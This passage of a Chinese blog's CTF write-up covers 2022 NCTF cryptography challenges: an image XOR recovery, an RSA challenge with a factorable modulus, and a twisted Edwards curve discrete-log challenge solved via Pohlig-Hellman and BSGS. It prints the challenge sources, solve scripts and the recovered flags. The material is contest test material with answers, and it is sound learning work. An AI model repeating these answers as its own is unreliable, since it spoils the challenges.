<span class="built_in">len</span>(ini_rand), <span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">ini = [<span class="built_in">int</span>(_, <span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> ini]</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">flag = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (width, height))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        pix = img3.getpixel((j, i))</span><br><span class="line">        flag.putpixel((j, i), (pix[<span class="number">0</span>] ^ ini[x], pix[<span class="number">1</span>] ^ ini[x + <span class="number">1</span>], pix[<span class="number">2</span>] ^ ini[x + <span class="number">2</span>]))</span><br><span class="line">        x += <span class="number">3</span></span><br><span class="line">flag.show()</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/14/2022NCTF/MyBlog\source_posts\2022NCTF.assets\image-20230314213110239.png" alt="image-20230314213110239"></p>
<h2 id="dp-promax"><a href="#dp-promax" class="headerlink" title="dp_promax"></a>dp_promax</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nbits = <span class="number">2200</span></span><br><span class="line">beta = <span class="number">0.4090</span></span><br><span class="line">p, q = getPrime(<span class="built_in">int</span>((<span class="number">1.</span> - beta) * nbits)), getPrime(<span class="built_in">int</span>(beta * nbits))</span><br><span class="line">dp = getrandbits(<span class="number">50</span>) | <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = (p - <span class="number">1</span>) * getrandbits(<span class="number">2800</span>) + dp</span><br><span class="line">    <span class="keyword">if</span> GCD((p - <span class="number">1</span>) * (q - <span class="number">1</span>), d) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">e = inverse(d, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">N = p * q</span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, N)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">46460689902575048279161539093139053273250982188789759171230908555090160106327807756487900897740490796014969642060056990508471087779067462081114448719679327369541067729981885255300592872671988346475325995092962738965896736368697583900712284371907712064418651214952734758901159623911897535752629528660173915950061002261166886570439532126725549551049553283657572371862952889353720425849620358298698866457175871272471601283362171894621323579951733131854384743239593412466073072503584984921309839753877025782543099455341475959367025872013881148312157566181277676442222870964055594445667126205022956832633966895316347447629237589431514145252979687902346011013570026217</span></span><br><span class="line"><span class="string">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line"><span class="string">28467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>发现N可以分解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">13434798417717858802026218632686207646223656240227697459980291922185309256011429515560448846041054116798365376951158576013804627995117567639828607945684892331883636455939205318959165789619155365126516341843169010302438723082730550475978469762351865223932725867052322338651961040599801535197295746795446117201188049551816781609022917473182830824520936213586449114671331226615141179790307404380127774877066477999810164841181390305630968947277581725499758683351449811465832169178971151480364901867866015038054230812376656325631746825977860786943183283933736859324046135782895247486993035483349299820810262347942996232311978102312075736176752844163698997988956692449</span></span><br><span class="line">c = <span class="number">28467178002707221164289324881980114394388495952610702835708089048786417144811911352052409078910656133947993308408503719003695295117416819193221069292199686731316826935595732683131084358071773123683334547655644422131844255145301597465782740484383872480344422108506521999023734887311848231938878644071391794681783746739256810803148574808119264335234153882563855891931676015967053672390419297049063566989773843180697022505093259968691066079705679011419363983756691565059184987670900243038196495478822756959846024573175127669523145115742132400975058579601219402887597108650628746511582873363307517512442800070071452415355053077719833249765357356701902679805027579294</span></span><br><span class="line">p=<span class="number">3628978044425516256252147348112819551863749940058657194357489608704171827031473111609089635738827298682760802716155197142949509565102167059366421892847010862457650295837231017990389942425249509044223464186611269388650172307612888367710149054996350799445205007925937223059</span></span><br><span class="line">q=<span class="number">12802692475349485610473781287027553390253771106432654573503896144916729600503566568750388778199186889792482907407718147190530044920232683163941552482789952714283570754056433670735303357508451647073211371989388879428065367142825533019883798121260838408498282273223302509241229258595176130544371781524298142815099491753819782913040582455136982147010841337850805642005577584947943848348285516563</span></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#nctf&#123;Th1s_N_May_n0t_s0@o0@@_secur3&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="superecc"><a href="#superecc" class="headerlink" title="superecc"></a>superecc</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> INF, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;nctf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(flag[<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">ecc = super_ecc()</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = ecc.mul(flag, G)</span><br><span class="line"><span class="built_in">print</span>(S)</span><br><span class="line"><span class="comment"># (98194560294138607903211673286210561363390596541458961277934545796708736630623,</span></span><br><span class="line"><span class="comment"># 58504021112693314176230785309962217759011765879155504422231569879170659690008)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>考查的是Twisted Edward Curve</p>
<p>题⽬定义了⼀个循环群上的点加法，搜索可以发现是Twisted Edward Curve</p>
<p><img src="/2023/03/14/2022NCTF/WAGZ2AYAFU.png" alt="img"></p>
<p>经过适当的变化可以将c消除掉，得到标准形式</p>
<p><img src="/2023/03/14/2022NCTF/SIGZ2AYAXQ.png" alt="img"></p>
<p>对于Twisted Edward Curve，可以转化为等价的Montgomery Curve</p>
<p><img src="/2023/03/14/2022NCTF/UMGZ2AYB44.png" alt="img"></p>
<p>Montgomery Curve的形式已经是Weierstrass形式的椭圆曲线，可以使⽤sage求解其阶，即求得了Twisted Edward Curve的阶寻找阶中的⼩素数因⼦，使⽤Pohlig Hellman + BSGS求解离散对数问题，得到flag的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">super_ecc</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">73101304688827564515346974949973801514688319206271902046500036921488731301311</span></span><br><span class="line">        self.c = <span class="number">78293161515104296317366169782119919020288033620228629011270781387408756505563</span></span><br><span class="line">        self.d = <span class="number">37207943854782934242920295594440274620695938273948375125575487686242348905415</span></span><br><span class="line">        self.p = <span class="number">101194790049284589034264952247851014979689350430642214419992564316981817280629</span></span><br><span class="line">        self.INF = (<span class="number">0</span>, self.c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, P, Q</span>):</span><br><span class="line">        (x1, y1) = P</span><br><span class="line">        (x2, y2) = Q</span><br><span class="line">        x3 = (x1 * y2 + y1 * x2) * inverse_mod(self.c * (<span class="number">1</span> + self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        y3 = (y1 * y2 - self.a * x1 * x2) * inverse_mod(self.c * (<span class="number">1</span> - self.d * x1 * x2 * y1 * y2), self.p) % self.p</span><br><span class="line">        <span class="keyword">return</span> (x3, y3)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">self, x, P</span>):</span><br><span class="line">        Q = self.INF</span><br><span class="line">        x = x % self.p</span><br><span class="line">        <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> x % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">                Q = self.add(Q, P)</span><br><span class="line">            P = self.add(P, P)</span><br><span class="line">            x = x &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> Q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_order</span>():</span><br><span class="line">    d = d * c^<span class="number">4</span> % p</span><br><span class="line">    A = <span class="number">2</span> * (a + d) * inverse_mod(a - d, p) % p</span><br><span class="line">    B = <span class="number">4</span> * inverse_mod(a - d, p) % p</span><br><span class="line">    a1 = <span class="number">0</span></span><br><span class="line">    a3 = <span class="number">0</span></span><br><span class="line">    a2 = A*B%p</span><br><span class="line">    a4 = B*B%p</span><br><span class="line">    a6 = <span class="number">0</span></span><br><span class="line">    E=EllipticCurve(GF(p),[a1,a2,a3,a4,a6])</span><br><span class="line">    np=E.cardinality()</span><br><span class="line">    <span class="keyword">return</span> ZZ(np)</span><br><span class="line"></span><br><span class="line">ecc = super_ecc()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pohlig_Hellman</span>(<span class="params">L, R, sub_order, order</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">P, Q</span>):</span><br><span class="line">        <span class="keyword">return</span> ecc.add(P, Q)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">P, x</span>):</span><br><span class="line">        <span class="keyword">return</span> ecc.mul(x % order, P)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">BSGS</span>(<span class="params">L, R, sub</span>):</span><br><span class="line">        L, R = mul(L, (order//sub)), mul(R, (order//sub))</span><br><span class="line"></span><br><span class="line">        m, dic = sqrt(sub).<span class="built_in">round</span>(), <span class="built_in">dict</span>()</span><br><span class="line">        ga = mul(L, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(m + <span class="number">1</span>)):</span><br><span class="line">            dic[<span class="built_in">str</span>(ga)], ga = i, add(ga, L)</span><br><span class="line">        gb = mul(L, (-m))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(sub//m + <span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span>(R) <span class="keyword">in</span> dic:</span><br><span class="line">                sk = i*m + dic[<span class="built_in">str</span>(R)]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sub&#125;</span> -&gt; <span class="subst">&#123;sk&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> ZZ(sk)</span><br><span class="line">            R = add(R, gb)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    sk = crt(</span><br><span class="line">        [BSGS(L, R, sub) <span class="keyword">for</span> sub <span class="keyword">in</span> sub_order],</span><br><span class="line">        sub_order</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> sk</span><br><span class="line"></span><br><span class="line"><span class="comment"># order = get_order()</span></span><br><span class="line">order = <span class="number">101194790049284589034264952247851014979635478581961323247248565451562534055248</span></span><br><span class="line">sub_order = [<span class="number">16</span>, <span class="number">113</span>, <span class="number">28921</span>, <span class="number">749971</span>, <span class="number">87374629</span>]</span><br><span class="line">G = (<span class="number">30539694658216287049186009602647603628954716157157860526895528661673536165645</span>,</span><br><span class="line">     <span class="number">64972626416868540980868991814580825204126662282378873382506584276702563849986</span>)</span><br><span class="line">S = (<span class="number">98194560294138607903211673286210561363390596541458961277934545796708736630623</span>,</span><br><span class="line">     <span class="number">58504021112693314176230785309962217759011765879155504422231569879170659690008</span>)</span><br><span class="line"></span><br><span class="line">sk = Pohlig_Hellman(G, S, sub_order, order)</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(sk))</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2022NCTF/" rel="tag">2022NCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> f14g
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="CTF"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/me">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->
 <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js"></script>
<script src="https://cdn.staticfile.org/mathjax/2.7.7/config/TeX-AMS-MML_HTMLorMML-full.js"></script>
<script>
  var ayerConfig = {
    mathjax: true,
  };
</script>

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->
 
<script src="/js/clickBoom2.js"></script>
 
<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>